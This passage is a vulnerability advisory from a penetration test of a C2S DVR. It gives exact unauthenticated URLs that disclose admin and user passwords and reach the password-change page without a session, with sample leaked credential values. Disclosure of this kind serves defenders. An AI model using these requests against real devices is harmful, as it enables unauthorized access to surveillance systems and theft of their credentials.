This vulnerability was identified during penetration test by Yakir Wizman.


3. Description
========================================
C2S DVR allows to unauthenticated user disclose the username & password remotely by simple request to the server page 'read.cgi?page=2' which can be made by browser or burp/fiddler.
Moreover, an attacker could easily access to password change page without any authentication, thats happen cuase the web application does not perform any session management.


4. Proof-of-Concept:
========================================
Remote Credentials Disclosure:
-----------------------------------------------
Simply go to the following url to read the credentials:
http://host:port/cgi-bin/read.cgi?page=2

Should return some javascript variable which contain the credentials and other configuration vars:

var pw_enflag = "1";
var pw_adminpw = "12345";
var pw_retype1 = "12345";
var pw_userpw = "56789";
var pw_retype2 = "56789";
var pw_autolock = "0";


Login @ http://host:port/
-----------------------------------------------


Authentication Bypass:
-----------------------------------------------
The application does not require a valid session for any page on the server, for example you can access to 'password.htm' which allows you to change/disclose the admin password with just a few clicks.

http://host:port/password.htm?parm1=&parm2=1
